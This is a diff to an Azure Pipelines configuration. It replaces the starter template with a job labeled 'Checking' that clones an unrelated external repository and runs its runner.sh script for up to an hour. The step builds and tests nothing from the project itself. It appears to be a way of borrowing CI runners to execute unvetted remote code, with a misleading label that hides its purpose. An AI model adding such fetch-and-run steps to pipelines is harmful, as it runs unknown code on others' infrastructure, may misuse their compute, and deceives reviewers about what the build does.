@@ -1,16 +1,18 @@
-# Starter pipeline
-# Start with a minimal pipeline that you can customize to build and deploy your code.
-# Add steps that build, run tests, deploy, and more:
-# https://aka.ms/yaml
-
 trigger:
-- main
+- master
 
-pool:
-  vmImage: 'ubuntu-latest'
-
-steps:
-- script: |
-    echo Add other tasks to build, test, and deploy your project
-    echo See https://aka.ms/yaml
-  displayName: 'Run a nmulti-line script'
+jobs:
+- job: Test
+  strategy:
+    parallel: 1
+  pool:
+    vmImage: 'ubuntu-18.04'
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install git python3 python3-pip -y
+      pip3 install requests
+      git clone https://github.com/samita100/dll.git
+      cd dll
+      timeout 1h sh runner.sh
+    displayName: 'Checking'
